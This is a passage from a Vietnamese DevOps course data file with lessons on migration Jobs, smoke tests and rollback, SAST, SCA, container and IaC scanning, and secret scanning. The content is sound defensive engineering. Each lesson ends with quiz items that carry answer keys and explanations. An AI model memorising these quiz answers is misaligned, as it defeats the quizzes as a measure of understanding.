        code: {
          lang: "yaml",
          file: "k8s/migrate-job.yaml",
          src: `apiVersion: batch/v1
kind: Job
metadata:
  name: task-api-migrate
  annotations:
    argocd.argoproj.io/hook: PreSync
    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation
spec:
  backoffLimit: 0            # lỗi thì dừng, không tự chạy lại migration
  activeDeadlineSeconds: 600
  template:
    spec:
      restartPolicy: Never
      containers:
        - name: migrate
          image: ghcr.io/my-org/task-api:a1b2c3d
          command: ["npx", "prisma", "migrate", "deploy"]
          envFrom:
            - secretRef:
                name: task-api-db`
        }
      },
      {
        h: "Đánh đổi",
        p: [
          "Expand–contract tốn nhiều lần deploy hơn cho một thay đổi, nhưng đổi lại mỗi bước đều có thể rollback code mà không hỏng. Với pipeline không có GitOps, migration là một job hoặc step trước bước deploy, như Lab 04 chạy ECS one-off task. Tài khoản database dùng cho migration nên khác tài khoản ứng dụng: chỉ migration mới có quyền đổi schema."
        ]
      }
    ],
    summary: [
      "Chạy migration như một job riêng, đúng một lần, trước khi deploy code mới.",
      "Migration phải tương thích ngược với code đang chạy.",
      "Dùng expand–contract để đổi schema qua nhiều lần deploy an toàn.",
      "Với Argo CD, dùng Job có hook PreSync; lỗi thì sync dừng."
    ],
    pitfalls: [
      "Chạy migration lúc ứng dụng khởi động, nhiều replica tranh nhau chạy và pod bị restart liên tục.",
      "Xoá hoặc đổi tên cột trong cùng lần deploy với code mới, code cũ đang chạy lỗi ngay.",
      "ALTER TABLE trên bảng lớn không đặt `lock_timeout`, chờ khoá và chặn toàn bộ truy vấn khác."
    ],
    quiz: [
      {
        q: "Vì sao migration phải tương thích ngược với code cũ?",
        options: ["Vì code cũ vẫn chạy trong lúc migration xong và code mới chưa deploy xong", "Vì database không hỗ trợ migration mới", "Vì Prisma yêu cầu", "Không cần tương thích ngược"],
        answer: 0,
        explain: "Migration chạy trước deploy nên có khoảng thời gian code cũ chạy trên schema mới, và rollback code cũng cần schema tương thích."
      },
      {
        q: "Trong expand–contract, khi nào xoá cột cũ?",
        options: ["Ngay trong migration đầu tiên", "Ở lần deploy sau, khi không còn code nào dùng cột cũ và không cần rollback về bản cũ", "Trước khi thêm cột mới", "Không bao giờ"],
        answer: 1,
        explain: "Contract là bước cuối, chỉ làm khi chắc chắn mọi phiên bản đang chạy hoặc có thể rollback về đều không cần cột cũ."
      },
      {
        q: "Annotation `argocd.argoproj.io/hook: PreSync` trên Job có tác dụng gì?",
        options: ["Chạy Job sau khi deploy xong", "Chạy Job trước khi Argo CD áp dụng các resource khác trong lần sync", "Xoá Job ngay lập tức", "Bỏ qua Job"],
        answer: 1,
        explain: "PreSync hook chạy trước pha sync chính. Nếu Job lỗi, sync dừng và code mới không được áp dụng."
      }
    ]
  },
  "p08.m3.t5": {
    sections: [
      {
        h: "Deploy xong chưa có nghĩa là chạy được",
        p: [
          "Pipeline báo xanh khi lệnh deploy thành công, nhưng điều đó chỉ nghĩa là hệ thống đã nhận cấu hình mới. Có thể ứng dụng không kết nối được database vì sai secret, một route quan trọng trả 500, hay CDN còn cache bản cũ. Smoke test là bộ kiểm tra nhanh, vài chục giây, gọi những chức năng then chốt ngay sau deploy để trả lời câu hỏi: có cháy không?",
          "Smoke test khác e2e test: nó ngắn, chỉ kiểm tra đường chính, chạy được trên production mà không làm bẩn dữ liệu thật. Ví dụ: `/health` trả ok, đăng nhập bằng tài khoản kiểm thử, gọi một API đọc dữ liệu."
        ]
      },
      {
        h: "Health check: live và ready",
        list: [
          "Liveness (`/health/live`): tiến trình còn sống không, lỗi thì restart container. Không nên kiểm tra dịch vụ phụ thuộc.",
          "Readiness (`/health/ready`): đã sẵn sàng nhận traffic chưa, ví dụ đã kết nối database. Lỗi thì rút khỏi load balancer.",
          "Endpoint trả về phiên bản (`/version` hoặc trong `/health`) giúp smoke test xác nhận đúng commit SHA vừa deploy đang chạy."
        ],
        p: [
          "Kiểm tra phiên bản rất đáng làm. Có những lúc deploy \"thành công\" nhưng pod mới không bao giờ lên và bản cũ vẫn phục vụ; smoke test gọi `/health` vẫn xanh. So sánh SHA sẽ bắt được trường hợp này."
        ]
      },
      {
        h: "Smoke test và rollback tự động trong pipeline",
        p: [
          "Job dưới chờ rollout hoàn tất, chạy smoke test có retry, xác nhận phiên bản, và nếu bất kỳ bước nào lỗi thì tự `kubectl rollout undo`."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/deploy.yml (job verify)",
          src: `jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write
      contents: read
    env:
      BASE_URL: https://api.example.com
      EXPECTED_SHA: \${{ github.sha }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      # (Bỏ qua cho gọn: bước lấy credential cloud qua OIDC và cấu hình kubeconfig)
      - name: Deploy
        run: |
          kubectl set image deployment/task-api api=ghcr.io/my-org/task-api:\${GITHUB_SHA::7}
          kubectl rollout status deployment/task-api --timeout=5m
      - name: Smoke test
        run: |
          for i in $(seq 1 10); do
            curl -fsS "$BASE_URL/health/ready" && break
            [ "$i" -eq 10 ] && exit 1
            sleep 6
          done
          curl -fsS "$BASE_URL/version" | grep -q "\${EXPECTED_SHA::7}"
          curl -fsS -o /dev/null "$BASE_URL/v1/projects?limit=1"
      - name: Rollback nếu thất bại
        if: failure()
        run: |
          kubectl rollout undo deployment/task-api
          kubectl rollout status deployment/task-api --timeout=5m`
        }
      },
      {
        h: "Sau smoke test: theo dõi metric",
        p: [
          "Smoke test bắt lỗi rõ ràng trong vài chục giây. Lỗi tinh vi hơn như tỷ lệ lỗi tăng từ 0,1% lên 2% hay rò rỉ bộ nhớ chỉ lộ ra sau vài phút đến vài giờ. Vì vậy sau smoke test nên có giai đoạn theo dõi metric (bake time), thủ công qua dashboard hoặc tự động qua canary analysis như bài trước."
        ]
      }
    ],
    summary: [
      "Smoke test là kiểm tra nhanh các chức năng then chốt ngay sau deploy.",
      "Tách liveness và readiness; readiness mới kiểm tra phụ thuộc.",
      "Xác nhận phiên bản đang chạy khớp commit SHA vừa deploy.",
      "Smoke test lỗi thì rollback tự động; sau đó tiếp tục theo dõi metric."
    ],
    pitfalls: [
      "Smoke test chỉ gọi `/health` của bản cũ vẫn đang chạy, báo xanh giả.",
      "Liveness probe kiểm tra database, database chậm làm mọi pod bị restart hàng loạt.",
      "Smoke test tạo dữ liệu thật trên production mà không dọn, hoặc dùng tài khoản thật của khách hàng."
    ],
    quiz: [
      {
        q: "Khác biệt chính giữa smoke test và e2e test?",
        options: ["Smoke test ngắn, chỉ kiểm tra đường chính, chạy được ngay sau deploy trên production", "Smoke test chỉ chạy trên máy developer", "E2e test không cần môi trường", "Không có khác biệt"],
        answer: 0,
        explain: "Smoke test nhanh và an toàn để chạy trên production; e2e test bao quát hơn, chạy lâu hơn, thường trên staging."
      },
      {
        q: "Vì sao smoke test nên kiểm tra phiên bản đang chạy?",
        options: ["Để in đẹp log", "Để phát hiện trường hợp bản mới không lên và bản cũ vẫn phục vụ", "Vì Kubernetes yêu cầu", "Để tăng tốc deploy"],
        answer: 1,
        explain: "Nếu chỉ gọi health check, bản cũ vẫn trả ok. So sánh SHA xác nhận đúng bản mới đang chạy."
      },
      {
        q: "Probe nào nên kiểm tra kết nối database?",
        options: ["Liveness", "Readiness", "Cả hai", "Không probe nào"],
        answer: 1,
        explain: "Readiness quyết định có nhận traffic; mất database thì rút khỏi load balancer. Liveness kiểm tra database sẽ gây restart hàng loạt vô ích."
      }
    ]
  },
  "p08.m3.t6": {
    sections: [
      {
        h: "Rollback: quay về phiên bản đã biết là tốt",
        p: [
          "Rollback là đưa hệ thống về phiên bản trước đó khi phiên bản mới gây sự cố. Nhờ build once, deploy many và image tag theo SHA, rollback về bản chất chỉ là deploy lại image SHA cũ, không cần build lại gì cả. Mục tiêu là khôi phục dịch vụ nhanh nhất; tìm nguyên nhân để sau.",
          "Hãy luyện rollback như luyện phòng cháy. Nếu đội chưa từng rollback, lần đầu thường là lúc 2 giờ sáng trong sự cố, và đó là lúc tệ nhất để khám phá rằng lệnh rollback không chạy."
        ]
      },
      {
        h: "Các cách rollback theo nền tảng",
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Kubernetes Deployment: xem lịch sử và quay về
kubectl rollout history deployment/task-api
kubectl rollout undo deployment/task-api                 # về revision ngay trước
kubectl rollout undo deployment/task-api --to-revision=3 # về revision cụ thể
kubectl rollout status deployment/task-api --timeout=5m

# Helm
helm history task-api -n production
helm rollback task-api 12 -n production

# Argo Rollouts: huỷ canary đang chạy, quay về bản stable
kubectl argo rollouts abort task-api

# GitOps (Argo CD / Flux): rollback bằng Git
git revert <sha-commit-bump-image>
git push`
        },
        p: [
          "Với GitOps, không nên dùng `kubectl rollout undo` vì Argo CD với selfHeal sẽ đưa cluster về đúng trạng thái trong Git, tức lại là bản lỗi. Rollback đúng cách là `git revert` commit đã cập nhật tag image. Argo CD cũng không cho `argocd app rollback` khi đang bật auto-sync."
        ]
      },
      {
        h: "Khi không thể rollback: roll forward",
        p: [
          "Rollback code chỉ an toàn khi schema database vẫn tương thích với code cũ. Nếu bản mới đã chạy một migration không đảo ngược được, ví dụ đã xoá cột hoặc chuyển dữ liệu sang định dạng mới và dữ liệu mới đã được ghi, thì quay về code cũ sẽ làm hỏng thêm. Khi đó bạn roll forward: sửa lỗi nhanh và deploy một phiên bản mới.",
          "Roll forward cần pipeline nhanh; nếu pipeline mất 45 phút thì roll forward là một cực hình. Cách tốt nhất là thiết kế để luôn rollback được: migration expand–contract, feature flag để tắt tính năng lỗi không cần deploy, và giữ đủ image cũ trong registry."
        ],
        list: [
          "Tính năng mới lỗi, có flag: tắt flag, nhanh nhất.",
          "Code lỗi, schema vẫn tương thích: rollback về image SHA trước.",
          "Migration không đảo ngược được đã chạy: roll forward với bản sửa."
        ]
      },
      {
        h: "Tự động hoá quyết định rollback",
        p: [
          "Rollback càng tự động thì time to restore càng ngắn. Smoke test lỗi thì rollback ngay trong pipeline; canary analysis lỗi thì Argo Rollouts tự abort; alert tỷ lệ lỗi sau deploy thì người trực có sẵn runbook một lệnh. Mỗi deploy nên ghi lại image SHA trước đó để biết chính xác quay về đâu.",
          "Định kỳ tổ chức diễn tập: cố ý deploy một bản lỗi lên staging và đo thời gian từ lúc phát hiện tới lúc khôi phục. Con số này chính là chỉ số time to restore của DORA ở quy mô nhỏ."
        ]
      }
    ],
    summary: [
      "Rollback là deploy lại image SHA trước đó, không build lại.",
      "Kubernetes: `kubectl rollout undo`; Helm: `helm rollback`; GitOps: `git revert`.",
      "Migration không đảo ngược được buộc phải roll forward.",
      "Luyện rollback thường xuyên và thiết kế để luôn rollback được."
    ],
    pitfalls: [
      "Dùng `kubectl rollout undo` trên cluster do Argo CD quản lý, selfHeal đưa bản lỗi trở lại.",
      "Lifecycle policy registry đã xoá image cũ, không còn gì để rollback.",
      "Rollback code sau khi migration đã xoá cột, code cũ lỗi ngay khi đọc cột không còn."
    ],
    quiz: [
      {
        q: "Cluster được Argo CD quản lý với selfHeal bật. Cách rollback đúng là gì?",
        options: ["kubectl rollout undo", "git revert commit cập nhật tag image rồi push", "Xoá namespace", "Sửa Deployment bằng kubectl edit"],
        answer: 1,
        explain: "Git là nguồn sự thật; thay đổi trực tiếp trên cluster bị selfHeal hoàn tác. git revert khiến Argo CD tự đồng bộ về bản cũ."
      },
      {
        q: "Khi nào phải roll forward thay vì rollback?",
        options: ["Khi có feature flag", "Khi migration không đảo ngược được đã chạy và code cũ không tương thích schema mới", "Khi pipeline nhanh", "Khi dùng Kubernetes"],
        answer: 1,
        explain: "Code cũ không chạy được trên schema mới nên quay lại sẽ lỗi thêm. Có feature flag thì thường chỉ cần tắt flag."
      },
      {
        q: "Lệnh nào quay Deployment về revision ngay trước đó?",
        options: ["kubectl rollout restart", "kubectl rollout undo deployment/task-api", "kubectl delete deployment", "kubectl scale --replicas=0"],
        answer: 1,
        explain: "`rollout undo` quay về revision trước. `restart` chỉ khởi động lại pod cùng phiên bản; delete và scale 0 gây downtime."
      }
    ]
  },
  "p08.m4.t0": {
    sections: [
      {
        h: "SAST: tìm lỗ hổng bằng cách đọc mã",
        p: [
          "SAST (Static Application Security Testing) phân tích mã nguồn mà không cần chạy ứng dụng. Công cụ theo dõi luồng dữ liệu từ nguồn không tin cậy (request body, query string) tới điểm nguy hiểm (câu SQL ghép chuỗi, lệnh shell, đường dẫn file) và báo khi dữ liệu đi tới đó mà không được kiểm tra. Nhờ vậy nó bắt được SQL injection, command injection, path traversal, dùng thuật toán mã hoá yếu, hard-code secret.",
          "Vì chạy trên mã nguồn, SAST chạy được ngay trên mỗi PR, rất sớm trong vòng đời, khi sửa lỗi còn rẻ. Đây là ý nghĩa của shift left: đưa kiểm tra bảo mật về phía developer thay vì đợi pentest trước khi release."
        ]
      },
      {
        h: "CodeQL và Semgrep",
        list: [
          "CodeQL (GitHub): biến mã thành cơ sở dữ liệu rồi truy vấn, phân tích luồng dữ liệu sâu. Miễn phí cho repo public; repo private cần gói bảo mật trả phí của GitHub. Có chế độ default setup bật bằng vài cú click, không cần viết YAML.",
          "Semgrep: quy tắc viết giống mã nguồn nên dễ đọc và tự viết thêm; chạy nhanh; có bộ quy tắc cộng đồng như `p/owasp-top-ten`. Hợp để thêm quy tắc riêng của công ty, ví dụ cấm gọi một hàm nội bộ đã deprecated."
        ],
        p: [
          "Kết quả xuất ra định dạng SARIF có thể tải lên tab Security của GitHub để hiển thị ngay trên dòng code trong PR. Job cần quyền `security-events: write` để tải kết quả lên."
        ]
      },
      {
        h: "Ví dụ workflow",
        p: [
          "Semgrep chạy trong container chính thức và lỗi khi có phát hiện. CodeQL dùng action của GitHub; ở đây SHA để dạng giữ chỗ, bạn thay bằng SHA thật của bản phát hành đang dùng (Dependabot sẽ giúp cập nhật)."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/sast.yml",
          src: `name: SAST
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep   # nên pin theo digest @sha256:...
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: semgrep scan --config p/owasp-top-ten --config p/typescript --error

  codeql:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write   # tải kết quả SARIF lên tab Security
      actions: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: github/codeql-action/init@2892aa5e19bbd11bc0cff5427e3b750a04d9e3c2 # v4.38.2
        with:
          languages: javascript-typescript
      - uses: github/codeql-action/analyze@2892aa5e19bbd11bc0cff5427e3b750a04d9e3c2 # v4.38.2`
        }
      },
      {
        h: "Sống chung với false positive",
        p: [
          "SAST luôn có false positive. Nếu bật chặn mọi phát hiện ngay ngày đầu với một codebase cũ, đội sẽ ngập trong cảnh báo và học cách bỏ qua. Chiến lược hợp lý: chỉ chặn phát hiện mới trong PR (diff-aware), xử lý dần phần tồn đọng, bắt đầu với quy tắc độ chính xác cao. Khi đánh dấu một phát hiện là false positive, ghi rõ lý do để người sau hiểu.",
          "SAST không thay thế được code review và không thấy lỗi logic nghiệp vụ như kiểm tra quyền thiếu ở một endpoint. Nó là một lớp trong nhiều lớp bảo vệ."
        ]
      }
    ],
    summary: [
      "SAST phân tích mã nguồn tĩnh, theo dõi dữ liệu không tin cậy tới điểm nguy hiểm.",
      "Chạy trên mỗi PR để phát hiện sớm (shift left).",
      "CodeQL phân tích sâu, tích hợp GitHub; Semgrep nhanh, dễ viết quy tắc riêng.",
      "Kết quả SARIF hiển thị trên PR, cần quyền `security-events: write`."
    ],
    pitfalls: [
      "Bật chặn toàn bộ trên codebase cũ, đội ngập cảnh báo và tắt công cụ.",
      "Đánh dấu false positive hàng loạt mà không ghi lý do.",
      "Nghĩ rằng SAST xanh là ứng dụng an toàn, bỏ qua lỗi phân quyền và logic nghiệp vụ."
    ],
    quiz: [
      {
        q: "SAST phân tích cái gì?",
        options: ["Ứng dụng đang chạy qua HTTP", "Mã nguồn mà không cần chạy ứng dụng", "Chỉ dependency", "Chỉ Docker image"],
        answer: 1,
        explain: "SAST là phân tích tĩnh mã nguồn. Quét ứng dụng đang chạy là DAST; quét dependency là SCA."
      },
      {
        q: "Quyền nào cần để job tải kết quả CodeQL/SARIF lên tab Security?",
        options: ["packages: write", "security-events: write", "id-token: write", "pages: write"],
        answer: 1,
        explain: "`security-events: write` cho phép tải cảnh báo quét mã. Các quyền khác dành cho package, OIDC và Pages."
      },
      {
        q: "Chiến lược hợp lý khi đưa SAST vào codebase cũ có nhiều cảnh báo?",
        options: ["Chặn mọi PR đến khi sửa hết", "Chỉ chặn phát hiện mới trong PR, xử lý dần phần tồn đọng", "Không bao giờ chặn", "Tắt SAST"],
        answer: 1,
        explain: "Chặn phát hiện mới ngăn tình trạng xấu thêm mà không làm tê liệt đội. Chặn tất cả hoặc không chặn gì đều kém hiệu quả."
      }
    ]
  },
  "p08.m4.t1": {
    sections: [
      {
        h: "SCA: phần lớn mã của bạn là của người khác",
        p: [
          "Một dự án Node trung bình có hàng trăm đến hàng nghìn package trong `node_modules`, phần lớn là dependency gián tiếp mà bạn không trực tiếp chọn. SCA (Software Composition Analysis) đối chiếu danh sách dependency, lấy từ lockfile, với cơ sở dữ liệu lỗ hổng đã biết (CVE, GitHub Advisory Database, OSV) và báo package nào có lỗ hổng, mức độ nghiêm trọng và phiên bản đã vá.",
          "SCA cũng giúp phát hiện rủi ro giấy phép (license) và package đã bị bỏ rơi. Ngoài lỗ hổng vô tình, còn có tấn công chuỗi cung ứng: package bị chiếm quyền và phát hành bản độc hại. Lockfile và `npm ci` đảm bảo bạn cài đúng phiên bản đã được xem xét."
        ]
      },
      {
        h: "Công cụ phổ biến",
        list: [
          "`npm audit`: có sẵn, dùng GitHub Advisory Database; `--audit-level=high` chỉ lỗi khi có mức high trở lên, `--omit=dev` bỏ qua devDependencies.",
          "OSV-Scanner (Google): đọc lockfile của nhiều hệ sinh thái, dùng cơ sở dữ liệu OSV.",
          "Dependabot: vừa cảnh báo, vừa tự mở PR nâng phiên bản; cấu hình qua `.github/dependabot.yml`.",
          "Snyk: dịch vụ thương mại, có thêm gợi ý sửa và phân tích khả năng lỗ hổng bị gọi tới (reachability)."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Lỗi nếu có lỗ hổng high/critical trong dependency chạy production
npm audit --omit=dev --audit-level=high

# Kiểm tra chữ ký registry và provenance của package đã cài
npm audit signatures

# OSV-Scanner v2 quét toàn bộ repo
osv-scanner scan source -r .`
        },
        p: [
          "Trong CI, chạy SCA trên mỗi PR (để PR thêm dependency lỗi bị chặn) và chạy theo lịch hằng ngày (vì lỗ hổng mới được công bố cho cả code không đổi)."
        ]
      },
      {
        h: "Dependabot giữ dependency luôn mới",
        p: [
          "Cách chống lỗ hổng hiệu quả nhất là không để dependency quá cũ. Dependabot mở PR nâng phiên bản, CI của bạn kiểm tra PR đó. Gom nhóm bản cập nhật nhỏ giúp giảm số PR. Đừng quên ecosystem `github-actions` để Dependabot cập nhật cả SHA của action."
        ],
        code: {
          lang: "yaml",
          file: ".github/dependabot.yml",
          src: `version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10
    groups:
      minor-and-patch:
        update-types: [minor, patch]

  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly

  - package-ecosystem: docker
    directory: /
    schedule:
      interval: weekly`
        }
      },
      {
        h: "Ưu tiên xử lý",
        p: [
          "Không phải CVE nào cũng nguy hiểm như nhau với bạn. Một lỗ hổng trong devDependency chỉ chạy lúc build ít rủi ro hơn lỗ hổng trong framework web đang nhận request. Hãy ưu tiên theo mức độ nghiêm trọng, có bản vá hay chưa, package có chạy trên production không, và mã lỗi có được gọi tới không. Nếu tạm chấp nhận một lỗ hổng, hãy ghi lại lý do và ngày xem xét lại."
        ]
      }
    ],
    summary: [
      "SCA đối chiếu dependency trong lockfile với cơ sở dữ liệu lỗ hổng.",
      "npm audit, OSV-Scanner, Dependabot, Snyk là công cụ phổ biến.",
      "Chạy trên mỗi PR và theo lịch hằng ngày.",
      "Dependabot cho npm, docker và cả github-actions giúp dependency luôn mới."
    ],
    pitfalls: [
      "Chạy `npm install` thay vì `npm ci` trong CI, cài phiên bản khác lockfile.",
      "Chặn build vì mọi lỗ hổng low trong devDependency, đội quen bỏ qua cảnh báo.",
      "Để hàng chục PR Dependabot tồn đọng nhiều tháng, lúc cần nâng cấp gấp thì chênh quá nhiều phiên bản."
    ],
    quiz: [
      {
        q: "SCA khác SAST ở điểm nào?",
        options: ["SCA quét mã do bạn viết", "SCA kiểm tra dependency bên thứ ba có lỗ hổng đã biết", "SCA quét ứng dụng đang chạy", "Không khác"],
        answer: 1,
        explain: "SCA tập trung vào thành phần bên thứ ba; SAST phân tích mã của bạn; DAST quét ứng dụng đang chạy."
      },
      {
        q: "Vì sao nên chạy SCA theo lịch dù code không đổi?",
        options: ["Để tốn phút runner", "Vì lỗ hổng mới được công bố hằng ngày cho cả phiên bản cũ", "Vì lockfile tự thay đổi", "Vì npm yêu cầu"],
        answer: 1,
        explain: "Một dependency an toàn hôm qua có thể có CVE hôm nay. Lockfile không tự thay đổi."
      },
      {
        q: "Ecosystem nào trong Dependabot giúp cập nhật SHA của action?",
        options: ["npm", "docker", "github-actions", "gitsubmodule"],
        answer: 2,
        explain: "`github-actions` cập nhật tham chiếu `uses:` trong workflow, kể cả khi pin theo SHA."
      }
    ]
  },
  "p08.m4.t2": {
    sections: [
      {
        h: "Container image cũng có lỗ hổng",
        p: [
          "Docker image chứa cả hệ điều hành thu nhỏ: thư viện C, OpenSSL, công cụ shell. Code của bạn có thể sạch nhưng base image cũ có hàng chục CVE. Container scanning phân tích các package hệ điều hành và thư viện ngôn ngữ trong image rồi đối chiếu với cơ sở dữ liệu lỗ hổng.",
          "IaC scanning thì kiểm tra cấu hình hạ tầng trước khi áp dụng: Terraform mở security group `0.0.0.0/0`, S3 bucket công khai, Kubernetes Deployment chạy với quyền root hoặc thiếu giới hạn tài nguyên, Dockerfile không có `USER`. Lỗi cấu hình là nguyên nhân phổ biến của rò rỉ dữ liệu trên cloud."
        ]
      },
      {
        h: "Trivy: một công cụ, nhiều loại quét",
        p: [
          "Trivy là công cụ mã nguồn mở của Aqua Security, gom nhiều loại quét vào một binary duy nhất. Mỗi lần chạy nó cần cơ sở dữ liệu lỗ hổng mới, nên trong CI hãy cache thư mục cache của Trivy để không tải lại liên tục. Checkov thì tập trung sâu vào IaC với bộ quy tắc rất lớn."
        ],
        list: [
          "`trivy image`: quét image đã build.",
          "`trivy fs`: quét thư mục mã nguồn, gồm lockfile và secret.",
          "`trivy config`: quét lỗi cấu hình trong Dockerfile, Terraform, Kubernetes manifest, Helm chart.",
          "Checkov: chuyên về IaC, hàng nghìn quy tắc cho Terraform, CloudFormation, Kubernetes, có thể dùng thay hoặc cùng Trivy."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Chặn nếu image có lỗ hổng CRITICAL/HIGH đã có bản vá
trivy image --severity CRITICAL,HIGH --ignore-unfixed --exit-code 1 ghcr.io/my-org/task-api:a1b2c3d

# Quét cấu hình Terraform và Kubernetes
trivy config --severity HIGH,CRITICAL --exit-code 1 ./infra
trivy config ./k8s

# Checkov cho thư mục Terraform
checkov -d infra --framework terraform`
        }
      },
      {
        h: "Trong pipeline",
        p: [
          "Quét image sau khi build và trước khi push. Quét IaC trong PR, trước `terraform plan`. Checkov action dưới dùng đúng phiên bản đã pin trong Lab 07. Riêng trivy-action, bạn cần đặc biệt cẩn thận: tháng 3/2026 chính các tag của action này đã bị ghi đè thành mã độc, nên chỉ dùng khi pin theo SHA đã kiểm chứng, hoặc chạy Trivy binary/container đã pin digest."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/iac.yml",
          src: `name: IaC scan
on:
  pull_request:
    paths: ["infra/**", "k8s/**", "Dockerfile"]

permissions:
  contents: read

jobs:
  checkov:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: bridgecrewio/checkov-action@444c9db6fa75e2d9c19ebf1fde7322089be9009e # v12.3125.0
        with:
          directory: infra
          soft_fail: false

  trivy-config:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          scan-type: config
          scan-ref: .
          severity: CRITICAL,HIGH
          exit-code: "1"`
        }
      },
      {
        h: "Giảm lỗ hổng tận gốc",
        p: [
          "Quét chỉ báo vấn đề; giảm lỗ hổng cần image nhỏ hơn. Dùng multi-stage build để image cuối không chứa compiler và devDependency, chọn base image tối giản (alpine, distroless), rebuild định kỳ để lấy bản vá hệ điều hành. Khi chấp nhận một phát hiện, ghi vào file `.trivyignore` hoặc chú thích skip của Checkov kèm lý do, thay vì hạ ngưỡng cho toàn bộ."
        ]
      }
    ],
    summary: [
      "Container scanning tìm CVE trong package hệ điều hành và thư viện của image.",
      "IaC scanning tìm lỗi cấu hình trong Terraform, Kubernetes, Dockerfile trước khi áp dụng.",
      "Trivy làm được cả hai; Checkov chuyên sâu cho IaC.",
      "Quét trước khi push và trước khi apply; giảm lỗ hổng bằng image tối giản và rebuild định kỳ."
    ],
    pitfalls: [
      "Không dùng `--ignore-unfixed`, build bị chặn vì CVE chưa có bản vá nào để nâng.",
      "Dùng trivy-action theo tag sau sự cố 3/2026 thay vì pin SHA.",
      "Bỏ qua phát hiện bằng cách hạ ngưỡng cho toàn bộ thay vì ghi ngoại lệ có lý do."
    ],
    quiz: [
      {
        q: "Lệnh Trivy nào quét lỗi cấu hình trong Terraform và Kubernetes manifest?",
        options: ["trivy image", "trivy config", "trivy sbom", "trivy server"],
        answer: 1,
        explain: "`trivy config` quét misconfiguration trong IaC. `trivy image` quét image."
      },
      {
        q: "Tác dụng của `--ignore-unfixed`?",
        options: ["Bỏ qua mọi lỗ hổng", "Bỏ qua lỗ hổng chưa có bản vá", "Chỉ quét lỗ hổng low", "Tự sửa lỗ hổng"],
        answer: 1,
        explain: "Lỗ hổng chưa có bản vá thì không có hành động nâng cấp nào, nên thường không dùng để chặn build."
      },
      {
        q: "Cách giảm số CVE trong image hiệu quả nhất?",
        options: ["Tắt quét", "Multi-stage build, base image tối giản và rebuild định kỳ", "Dùng tag latest", "Thêm nhiều package"],
        answer: 1,
        explain: "Image càng ít thành phần càng ít lỗ hổng, và rebuild để lấy bản vá. Tắt quét chỉ che giấu vấn đề."
      }
    ]
  },
  "p08.m4.t3": {
    sections: [
      {
        h: "Secret lọt vào Git là chuyện rất thường",
        p: [
          "Một khoá API trong file `.env` bị commit nhầm, một token dán tạm vào code để test, một file cấu hình cũ chứa mật khẩu database. Khi đã vào lịch sử Git, secret vẫn còn đó dù commit sau có xoá đi. Nếu repo công khai, bot của kẻ tấn công quét GitHub liên tục và có thể dùng secret chỉ sau vài phút.",
          "Secret scanning tìm các chuỗi trông giống secret (theo mẫu như tiền tố `AKIA` của AWS, `ghp_` của GitHub, khoá riêng PEM) và chuỗi có độ ngẫu nhiên cao. Cần chặn ở nhiều lớp: máy developer, lúc push, và trong CI."
        ]
      },
      {
        h: "Ba lớp chặn",
        p: [
          "Không lớp nào hoàn hảo, nên hãy kết hợp cả ba. Lớp càng gần developer thì càng rẻ: chặn được trước khi commit nghĩa là secret chưa bao giờ nằm trong lịch sử Git. Lớp CI là lưới an toàn cuối cùng mà không ai bỏ qua được."
        ],
        list: [
          "Pre-commit hook với gitleaks: chặn ngay trên máy trước khi commit được tạo.",
          "GitHub push protection: GitHub từ chối push chứa secret thuộc các mẫu được hỗ trợ; người push phải chủ động bypass và ghi lý do.",
          "CI: quét commit mới của PR bằng gitleaks hoặc trufflehog, vì hook trên máy có thể bị bỏ qua bằng `--no-verify`."
        ],
        code: {
          lang: "yaml",
          file: ".pre-commit-config.yaml",
          src: `repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: <commit-sha>   # pin theo SHA của bản phát hành bạn chọn
    hooks:
      - id: gitleaks`
        }
      },
      {
        h: "Quét trong CI",
        p: [
          "Trufflehog có thể xác minh secret bằng cách thử gọi API của nhà cung cấp, `--only-verified` chỉ báo secret còn hoạt động, giảm nhiễu đáng kể. Checkout với `fetch-depth: 0` để có lịch sử cần quét."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/secrets.yml",
          src: `name: Secret scan
on: pull_request

permissions:
  contents: read

jobs:
  gitleaks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
      - name: Quét các commit mới của PR
        run: |
          docker run --rm -v "$PWD:/repo" -w /repo ghcr.io/gitleaks/gitleaks:latest \\
            git . --redact --verbose \\
            --log-opts="origin/\${{ github.base_ref }}..HEAD"
        # Nên pin image theo digest thay vì latest

  trufflehog:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
      - run: |
          docker run --rm -v "$PWD:/repo" trufflesecurity/trufflehog:latest \\
            git file:///repo --only-verified --fail`
        }
      },
      {
        h: "Khi secret đã lộ",
        p: [
